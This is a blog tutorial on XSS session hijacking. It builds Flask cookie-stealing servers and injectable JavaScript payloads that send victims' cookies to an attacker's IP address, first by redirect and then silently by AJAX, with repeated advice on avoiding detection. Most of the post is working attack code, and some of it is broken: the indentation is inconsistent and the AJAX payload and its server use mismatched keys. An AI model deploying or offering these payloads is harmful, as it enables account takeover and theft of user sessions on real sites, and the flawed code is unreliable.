---
layout: post
title: XSS Session Hijacking
categories:
- web hacking
- owasp top 10
---

![pwnt]({{ site.baseurl }}images/cookie-stealers/no-redirect/no-redirect-pwnt.png)

# Prerequisites

{% highlight bash %}

# create new project directory
mkdir cookiestealer

{% endhighlight %}

We then enter our new directory and create a new virtual environment within it:

{% highlight bash %}

# initialize virtual environment
cd cookiestealer
virtualenv --no-site-packages env

{% endhighlight %}

Next we activate our virtual environment:

{% highlight bash %}

. env/bin/activate

{% endhighlight %}

We then create a dependency file containing flask and flask-cors.

{% highlight bash %}

echo "flask\nflask-cors" > pip.req

{% endhighlight %}

Finally, we install the dependencies enumerated within pip.req:

{% highlight bash %}

pip install -r pip.req

{% endhighlight %}

# Building a Simple Cookie Stealer (no redirect)

All cookie stealers have two components. The first component is a server that stores stolen cookies in some kind of file or database. The second component is malicious javascript that is injected into the target webpage. When the victim loads the infected web page, the malicious javascript makes a GET or POST request to the server, passing the victim’s  cookies as a request parameter. The server then logs the cookies in a file or database. 

Let's build a simple cookie stealer that follows this model. In our project directory, create a new file named 'no-redirect.py'.

{% highlight bash %}

touch no-redirect.py

{% endhighlight %}

Let's then open up no-redirect.py in a text editor such as vim, and the following lines of code to the top of the file to import Flask and Flask-CORS.


{% highlight python %}
from flask import Flask, request, render_template
from flask.ext.cors import CORS

{% endhighlight %}

We're then going to instantiate a new Flask object. Flask objects can be thought of as lightweight HTTP servers responsible for handling incoming HTTP requests.

{% highlight python %}

# instantiate new Flask object
app = Flask(__name__)

# turn on debug output
app.debug = True

{% endhighlight %}

Our cookie stealer needs to be able to accept and handle HTTP requests originating from domains other than its own. In other words, the target website needs to be able to send information to our server despite the fact that it is located at another domain.

This presents us with a problem, because Flask strictly enforces _Same Origin Policy_.


> . . . same-origin policy is an important concept in the web application security model. Under the policy, a web browser permits scripts contained in a first web page to access data in a second web page, but only if both web pages have the same origin. An origin is defined as a combination of URI scheme, hostname, and port number. This policy prevents a malicious script on one page from obtaining access to sensitive data on another web page through that page's Document Object Model.
> -- <cite>[Wikipedia](https://en.wikipedia.org/wiki/Same-origin_policy)</cite>

Flask does not provide a simple interface to disable _Same Origin Policy_. This means that we'll have to monkey patch Flask to enable our cookie stealing Javascript to talk to our cookie storing server. Fortunately, the Flask-CORS module that we installed using pip does all of the monkey patching for us. 

To disable Flask's same origin policy using Flask-CORS, we just add the following line to our no-redirect.py file.

{% highlight python %}

# disable Flask's same origin policy
CORS(app)

{% endhighlight %}

Our Flask object is instantiated and has been patched to accept cross origin requests. We now add a route handler for the main page:

{% highlight python %}

@app.route('/')
def index():
    cookies = request.args.get('cookies')
    with open('cookies.txt', 'a') as fd:
        print cookies
        fd.write(cookies)
    return render_template('index.html', cookies=cookies)

{% endhighlight %}

The code shown above tells Flask that any HTTP requests to our cookie stealer should be handled by the function named index(). Our index() function first stores any cookies passed as request parameters, and writes them to 'cookies.txt'. It then sends 'index.html' as an HTTP response, causing it to be displayed on the page. 

Finally, we add the following line of code that to our script to launch our server.

{% highlight python %}

# run cookie stealer server
app.run(host='0.0.0.0', port=80)

{% endhighlight %}

{% highlight python %}
from flask import Flask, request, render_template
from flask.ext.cors import CORS

app = Flask(__name__)
app.debug = True

CORS(app)

@app.route('/')
def index():

    cookies = request.args.get('cookies')
    with open('cookies.txt', 'a') as fd:
        print cookies
        fd.write(cookies)
    return render_template('index.html', cookies=cookies)

# run cookie stealer server
app.run(host='0.0.0.0', port=80)

{% endhighlight %}

The complete cookie stealing server is shown above.

# How to use a cookie stealer

VIDEO HERE

Now that we've built our cookie stealer, let's try using it in an actual XSS attack. This video uses three virtual machines running on a VMWare virtual network as a lab environment.

* 	OWASP Broken Web Applications Project (Target HTTP Server)

* 	Kali Linux

*	Fedora 22

The OSASP BWA virtual machine is running Damn Vulnerable Web App, which we will be attacking. For more information on running virtual machines, check out [this previous blog post](http://solstice.me/web%20hacking/sqli/2016/03/15/hacking-blindfolded/). Kali can be downloaded [here](https://www.offensive-security.com/kali-linux-vmware-virtualbox-image-download/). I'll be using my laptop running Fedora 22 as a victim in the attack.


# Improving our Cookie Stealer with Redirection


As you can see from the video, our cookie stealer has a pretty glaring limitation -- it's loud. The target web page is rendered unusable after the XSS attack, and all users are instantly redirected to an obviously malicious attack site. 

The way to fix this issue to redirect the user back to the infected web page instead of presenting them with a new html template. The code shown below does just that.

{% highlight python %}

from flask import Flask, request
from flask.ext.cors import CORS
from flask import redirect

app = Flask(__name__)
app.debug = True

CORS(app)

@app.route('/')
def index():

    cookies = request.args.get('cookies')
    with open('cookies.txt', 'a') as fd:
        fd.write(cookies)
    return redirect( request.referrer )

app.run(host='0.0.0.0', port=80)

{% endhighlight %}

Notice that we've added another import statement at the top of the file:

{% highlight python %}

from flask import redirect

{% endhighlight %}

This allows us to use Flask's redirect function within our code. We've also modified our return statement. It now redirects users back to their referrer instead of rendering a new web page.

{% highlight python %}

    return redirect( request.referrer )

{% endhighlight %}


As you can see in the following video, the attack is significantly more subtle. The user is redirected to the cookie stealer as soon as they load the page, before being redirected nearly instantly back their referrer. 


VIDEO HERE

Our improved cookie stealer is not without some problems, however. For one thing, it forms an infinite redirect loop between the target web page and the cookie stealer. The client accesses the page, is redirected to the cookie stealer, is redirected back to the target page, where it is redirected back to the cookie stealer, and so on and so forth.

This is a serious issue for multiple reasons. We end up with lots of duplicate session cookies. This means that it will be hard to locate individual cookies within our 'cookies.txt' file. It also means that the file will get very large, very quickly. The second issue is that the redirect loop generates very loud network traffic. Check out the wireshark output below.

WIRESHARK OUTPUT HERE

The constant redirection spread across multiple users amplifies the target webapp's normal HTTP traffic, greatly increasing the chances of the attacker being detected.  In a worse case scenario, where the site is already experiencing high volume, the additional traffic generated by the redirect loop could crash the server.

#Fixing our Improved Cookie Stealer

Fortunately, eliminating the redirect loop is relatively easy to do. We simply expand our server to set a cookie before redirecting back to the user. We then add Javascript code to our injection that checks for the presence of that cookie. If the cookie is not found, the injected Javascript code redirects the victim to the cookie stealer. Otherwise, the injected code does nothing.

Let's start out by adding this additional functionality to our cookie stealer. We need to add one more import statement to our 'allthecookies.py' file.

{% highlight python %}

from flask import make_response

{% endhighlight %}

We then use make\_response to create an HTTP response object that redirects to the target web page, and sets a cookie to indicate the user's session has already been stolen.

{% highlight python %}

from flask import Flask, request
from flask import redirect
from flask import make_response
from flask.ext.cors import CORS

CREDS_STOLEN = 'jd82d0k'

app = Flask(__name__)
app.debug = True

CORS(app)

@app.route('/')
def index():

    cookies = request.args.get('cookies')
    with open('cookies.txt', 'a') as fd:
        fd.write(cookies)

	# craft an http response with CREDS_STOLEN cookie
	response = make_response( redirect( request.referrer ) )
	response.set_cookie(CREDS_STOLEN, CREDS_STOLEN)

    return response

app.run(host='0.0.0.0', port=80)

{% endhighlight %}


Now that we've expanded our cookie stealer, let's modify our Javascript code to check for the existense of the cookie.

{% highlight javascript %}

if ( document.cookie.indexOf("jd82d0k") >= 0 ) {
	document.location = "http://172.16.156.132:5000?cookies="+document.cookie;
}

{% endhighlight %}

Our Javascript code is nearly exactly the same as before. Compacted into an injectable form, it looks like this:

{% highlight html %}
	<script>if (document.cookie.indexOf("jd82d0k") >= 0) {document.location = "http://172.16.156.132:5000?cookies="+document.cookie;}</script>
{% endhighlight %}

This is about as good as it gets for redirect based cookie stealers. As you can see in the video, the attack is visually subtle and does not produce excessive network traffic. Our Python script does leave room for improvements, however. We could spoof the referrer in the HTTP header to prevent our cookie stealer's IP address from showing up in log files on the target network. We could also use a 301 (permanent) redirect. Flask issues a 302, or temporary, redirect by default. Temporary redirects cause web browsers to continue to use the old url for future requests, rather than switch to a new one. This means that subsequent requests to the infected page will be made my first sending a request to our Cookie Stealer server. These improvements are left up to the reader as exercises.

VIDEO HERE

# AJAX - The Session Hijacker's Holy Grail

![Holy grail](http://www.intriguing.com/mp/_pictures/grail/large/HolyGrail051.jpg)

So far we've focused on stealing sessions by redirecting users to a malicious web server that logs their session cookies. Although this approach is simple and effective, it is subject to the limitations that we previously discussed. The most important of these limitations is the fact that redirect based cookie stealers always cause abnormal web traffic to and from the target server. The solution to this is to use _AJAX_.


> AJAX stands for Asynchronous JavaScript and XML. In a nutshell, it is the use of the XMLHttpRequest object to communicate with server-side scripts. It can send as well as receive information in a variety of formats, including JSON, XML, HTML, and even text files. AJAX’s most appealing characteristic, however, is its "asynchronous" nature, which means it can do all of this without having to refresh the page. This lets you update portions of a page based upon user events.  
> The two features in question are that you can:
>
> *	Make requests to the server without reloading the page
> * Receive and work with data from the server
>
> -- <cite>[Mozilla Developer Network](https://developer.mozilla.org/en-US/docs/AJAX/Getting_Started)</cite>

AJAX allows us to send a request from the victim's web browser to our cookie stealer without refreshing the page and, most importanty, without sending additional HTTP traffic to the target server. The user loads the infected page and has their cookies stolen silently in the background. The infamous [Sammy Worm](http://motherboard.vice.com/read/the-myspace-worm-that-changed-the-internet-forever) incorporated this technique into its source code.

## Building an AJAX cookie stealer

Let's start out by writing the Javascript code for our AJAX cookie stealer. Most modern websites use the [JQuery](https://jquery.com/) library for AJAX calls. This is because JQuery provides an extremely simple interface for making AJAX calls. With that said, we're not building a web application. We're exploiting one. Using JQuery could require us to inject additional code that would append a script tag to the HEAD of the target web page's DOM. The code to do this takes up additional space, and space is precious. It could be argued that since JQuery [is used by roughly 70% of the market](http://w3techs.com/technologies/details/js-jquery/all/all), we can assume that most websites already provide native JQuery support. Regardless, we want to write a general purpose cookie stealer that works universally across Javascript enabled websites.

The solution is to use Javascript's builtin [XMLHTTPRequest](https://developer.mozilla.org/en-US/docs/Web/API/XMLHttpRequest) api. It only takes three lines of code to write an AJAX based cookie stealer using XMLHTTPRequest.

{% highlight javascript %}

var xmlhttp = new XMLHttpRequest();
xmlhttp.open("POST", "http://192.168.1.191/update", true);
xmlhttp.send(JSON.stringify({hostname: window.location.host, session:document.cookie}));

{% endhighlight %}

The code shown above simply creates a new XMLHttpRequest objects, initializes a POST request object, and uses the request object to send the user's cookies to the attacker's server. The script's injectable form is shown below.

{% highlight html %}
<script> var xmlhttp = new XMLHttpRequest(); xmlhttp.open("POST", "http://192.168.1.191/update", true); xmlhttp.send(JSON.stringify({hostname: window.location.host, session:document.cookie})); </script>
{% endhighlight %}

The Python script that acts as our cookie stealer's server is similar to the ones we created before. Its distinctive characteristics are that it accepts 'POST' requests and grabs the cookies from the JSON POST data as opposed to the query string.

{% highlight python %}

from flask import Flask, request
from flask.ext.cors import CORS

app = Flask(__name__)
app.debug = True

CORS(app)

@app.route('/', methods = [ 'POST' ])
def index():

    cookies = request.json.get('cookies', None)

	if cookies is not None and cookies not in stolen_cookies:
		stolen_cookies.add(cookies)

    	with open('cookies.txt', 'a') as fd:
    	    fd.write(cookies)
	
		print cookies

    return {
		'Success' : True,
	}

app.run(host='0.0.0.0', port=80)

{% endhighlight %}

In addition, the script keeps a set of stolen cookies to keep duplicates to a minimum. You can see the AJAX cookie stealer in action in the video below.

VIDEO HERE

#Conclusion

In this post we developed two modern cookie stealers, placing an emphasis on stealth. These cookie stealers provide a means to steal session cookies in order to expand the attacker's access to the target website. Stealing sessions is ineffective in a number of situations however. These include websites that use http-only cookies, sessionless auth, or that require an additional passphrase to perform privileged operations.

In part II of this series, we'll be writing a Javascript keylogger that overcomes these limitations. The keylogger will use web sockets monitor keystrokes in real time, as well as map them to specific DOM elements so that the attacker knows what form on the page the victim is typing into.

You can check out and run all four demo scripts on Github [here](http://github.com/s0lst1c3/xss-session-hijacking).


